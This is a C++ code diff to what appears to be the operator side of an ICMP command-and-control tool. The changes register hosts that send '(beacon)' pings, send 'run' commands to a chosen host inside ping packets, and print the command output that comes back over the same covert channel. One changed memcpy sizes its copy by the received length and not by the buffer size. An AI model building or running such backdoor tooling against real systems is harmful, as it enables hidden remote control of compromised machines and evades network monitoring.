@@ -80,6 +80,17 @@ static uint16_t checksum(void *vdata, uint32_t size)
   return ~acc;
 }
 
+std::vector<std::string> split_input(std::string &input)
+{
+  std::vector<std::string> ret;
+  std::istringstream iss(input);
+  for (std::string s; iss >> s;)
+  {
+    ret.push_back(s);
+  }
+  return ret;
+}
+
 long send_ping(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
 {
   uint8_t out[1024];
@@ -129,12 +140,12 @@ long receive_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
     {
       if (buf && size > 0)
       {
-        memcpy(buf, in + sizeof(iphdr) + sizeof(icmphdr), size);
+        memcpy(buf, in + sizeof(iphdr) + sizeof(icmphdr), ret - sizeof(iphdr) - sizeof(icmphdr));
       }
     }
   }
 
-  return ret;
+  return ret - sizeof(iphdr) - sizeof(icmphdr);
 }
 
 void listen_task()
@@ -153,13 +164,17 @@ void listen_task()
     std::string src_ip;
     ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));
 
-    char *hostname_ = (char *)in;
-    std::string hostname = hostname_;
-
     if (num_bytes > 0)
     {
-      std::lock_guard<std::mutex> guard(cur_connections_mutex);
-      cur_connections[hostname] = src_ip;
+      char *hostname_ = (char *)in;
+      std::string hostname = hostname_;
+
+      auto split = split_input(hostname);
+      if (split.at(0).compare("(beacon)") == 0)
+      {
+        std::lock_guard<std::mutex> guard(cur_connections_mutex);
+        cur_connections[split.at(1)] = src_ip;
+      }
     }
   }
 }
@@ -176,19 +191,28 @@ void send_command(const std::string &dst, const std::string &command)
   std::string cmd = "run ";
   cmd.append(command);
 
-  std::vector<uint8_t> data{cmd.begin(), cmd.end()};
-  send_ping(sockfd, dst, data.data(), data.size());
-}
+  send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);
 
-std::vector<std::string> split_input(std::string &input)
-{
-  std::vector<std::string> ret;
-  std::istringstream iss(input);
-  for (std::string s; iss >> s;)
+  while (1)
   {
-    ret.push_back(s);
+    uint8_t in[512];
+    std::string src_ip;
+    ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));
+
+    if (dst != src_ip)
+      continue;
+
+    if (num_bytes > 0)
+    {
+      char *str_ = (char *)in;
+      std::string str(str_, num_bytes);
+      std::fputs(str.c_str(), stdout);
+    }
+    else
+    {
+      break;
+    }
   }
-  return ret;
 }
 
 int main(int argc, char **argv)
@@ -237,6 +261,10 @@ int main(int argc, char **argv)
       for (int i = 2; i < input_arr.size(); i++)
       {
         command.append(input_arr.at(i));
+        if (i != input_arr.size() - 1)
+        {
+          command.append(" ");
+        }
       }
 
       std::cout << "Running command \"" << command << "\" on "
